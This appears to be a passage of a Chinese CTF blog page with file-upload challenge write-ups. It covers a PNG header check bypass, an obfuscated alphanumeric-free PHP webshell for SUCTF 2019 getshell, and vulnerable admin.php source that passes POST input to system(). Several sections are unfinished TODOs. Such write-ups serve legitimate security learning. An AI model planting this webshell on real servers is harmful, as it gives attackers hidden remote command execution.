+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// check file type</span></span><br><span class="line">$finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">$type = finfo_file($finfo, $_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">finfo_close($finfo);</span><br><span class="line"><span class="keyword">if</span> (!in_array($type, [<span class="string">&#x27;image/png&#x27;</span>])) &#123;</span><br><span class="line">  <span class="built_in">error</span>(<span class="string">&#x27;Uploaded file is not PNG format.&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// check file width/height</span></span><br><span class="line">$size = getimagesize($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> ($size[<span class="number">0</span>] &gt; <span class="number">256</span> || $size[<span class="number">1</span>] &gt; <span class="number">256</span>) &#123;</span><br><span class="line">  <span class="built_in">error</span>(<span class="string">&#x27;Uploaded image is too large.&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($size[<span class="number">2</span>] !== IMAGETYPE_PNG) &#123;</span><br><span class="line">  <span class="comment">// I hope this never happens...</span></span><br><span class="line">  <span class="built_in">error</span>(<span class="string">&#x27;What happened...? OK, the flag for part 1 is: &lt;code&gt;&#x27;</span> . getenv(<span class="string">&#x27;FLAG1&#x27;</span>) . <span class="string">&#x27;&lt;/code&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先我们得了解PHP文件头格式是什么样的</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u013943420/article/details/76855416">https://blog.csdn.net/u013943420/article/details/76855416</a></p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200829113331.png" alt=""></p>
+<p><code>89 50 4E 47 0D 0A 1A 0A</code> 是PNG头部署名域，表示这是一个PNG图片<br>
+<code>00 00 00 0D</code> 描述IHDR头部的大小<br>
+<code>49 48 44 52</code> 是Chunk Type Code, 这里Chunk Type Code=IHDR</p>
+<p>接下来需要了解finfo_file函数和getimagesize函数的区别就在于：<code>FILEINFO</code> 可以识别 png 图片( 十六进制下 )的第一行，而 <code>getimagesize</code> 不可以。</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200829113733.png" alt=""></p>
+<h2 id="SUCTF-2019-getshell">SUCTF 2019 getshell</h2>
+<h3 id="考点-v10">考点</h3>
+<ul>
+<li>无数字字母webshell</li>
+</ul>
+<h3 id="解题-v10">解题</h3>
+<p>可用字符：<code>$().;=[]_~</code></p>
+<p>取反绕过，webshell：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_=~(瞎);</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line">$_=~(挟);</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line">$_=~(挟);</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line">$_=~(隙);</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line">$_=~(卸);</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line">$_=~(勋);</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line"></span><br><span class="line">$_=~(校);</span><br><span class="line">$___.=$_[[]==[]];</span><br><span class="line">$_=~(下);</span><br><span class="line">$___.=$_[[]==[]];</span><br><span class="line">$_=~(纤);</span><br><span class="line">$___.=$_[[]==[]];</span><br><span class="line">$_=~(嫌);</span><br><span class="line">$___.=$_[[]==[]];</span><br><span class="line">$___=$$___;</span><br><span class="line">$__($___[_]);</span><br></pre></td></tr></table></figure>
+<p>flag在env环境变量中。</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200916134726.png" alt=""></p>
+<h2 id="SUCTF-2019-Upload-Labs-2">SUCTF 2019 Upload Labs 2</h2>
+<h3 id="考点-v11">考点</h3>
+<h3 id="解题-v11">解题</h3>
+<p>admin.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ad</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $cmd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $clazz;</span><br><span class="line">    <span class="keyword">public</span> $func1;</span><br><span class="line">    <span class="keyword">public</span> $func2;</span><br><span class="line">    <span class="keyword">public</span> $func3;</span><br><span class="line">    <span class="keyword">public</span> $instance;</span><br><span class="line">    <span class="keyword">public</span> $arg1;</span><br><span class="line">    <span class="keyword">public</span> $arg2;</span><br><span class="line">    <span class="keyword">public</span> $arg3;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$cmd, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;cmd = $cmd;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;clazz = $clazz;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func1 = $func1;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func2 = $func2;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func3 = $func3;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;arg1 = $arg1;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;arg2 = $arg2;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;arg3 = $arg3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        $reflect = <span class="keyword">new</span> ReflectionClass(<span class="keyword">$this</span>-&gt;clazz);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;instance = $reflect-&gt;newInstanceArgs();</span><br><span class="line"></span><br><span class="line">        $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func1);</span><br><span class="line">        $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg1);</span><br><span class="line"></span><br><span class="line">        $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func2);</span><br><span class="line">        $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg2);</span><br><span class="line"></span><br><span class="line">        $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func3);</span><br><span class="line">        $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg3);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        system(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;admin&#x27;</span>]))&#123;</span><br><span class="line">        $cmd = $_POST[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        $clazz = $_POST[<span class="string">&#x27;clazz&#x27;</span>];</span><br><span class="line">        $func1 = $_POST[<span class="string">&#x27;func1&#x27;</span>];</span><br><span class="line">        $func2 = $_POST[<span class="string">&#x27;func2&#x27;</span>];</span><br><span class="line">        $func3 = $_POST[<span class="string">&#x27;func3&#x27;</span>];</span><br><span class="line">        $arg1 = $_POST[<span class="string">&#x27;arg1&#x27;</span>];</span><br><span class="line">        $arg2 = $_POST[<span class="string">&#x27;arg2&#x27;</span>];</span><br><span class="line">        $arg2 = $_POST[<span class="string">&#x27;arg3&#x27;</span>];</span><br><span class="line">        $admin = <span class="keyword">new</span> Ad($cmd, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3);</span><br><span class="line">        $admin-&gt;check();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You r not admin!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="TODO">TODO</h3>
+<h2 id="HarekazeCTF2019-Avatar-Uploader-2">HarekazeCTF2019 Avatar Uploader 2</h2>
+<h3 id="TODO-v2">TODO</h3>
+<h2 id="D3CTF-2019-EzUpload">D3CTF 2019 EzUpload</h2>
+<h3 id="TODO-v3">TODO</h3>
+
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+    <div id="disqus_thread"></div>
+    <script>
+    (function() { // DON'T EDIT BELOW THIS LINE
+    var d = document, s = d.createElement('script');
+    s.src = 'https://ca01h.disqus.com/embed.js';
+    s.setAttribute('data-timestamp', +new Date());
+    (d.head || d.body).appendChild(s);
+    })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image 
+    <div class="author-img">
+      
+        <figure
+          class="avatar avatar-lg"
+          data-initial="c"
+          style="background-color: #3b4351;">
+        </figure>
+      
+    </div> -->
+
+    <!-- Author title
+    <div class="author-title">
+      <div>ca01h</div>
+      <div>2020-08-18</div>
+    </div> -->
+	
+	<script src="https://www.hackthebox.eu/badge/212159"></script>
+  </div> 
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+	  <i class="fas fa-folder-open"></i>&nbsp;
+      <a class="category-link" href="/categories/CTF/">CTF</a>-><a class="category-link" href="/categories/CTF/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a>
+	  </br>
+	  <i class="fas fa-tags"></i>&nbsp;
+      <a class="tag-none-link" href="/tags/CTF/" rel="tag">#CTF</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+	  
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+<div align="center">
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv">Copyright © ca01h 2019-2020 | 本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+<!-- <span class="post-meta-divider">|</span> -->
+<!-- <span id="busuanzi_container_site_uv">本站访客数<span id="busuanzi_value_site_uv"></span>人</span> -->
+</div><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+</body>
+</html>
+
+
+
+<script src="/js/book.js"></script>
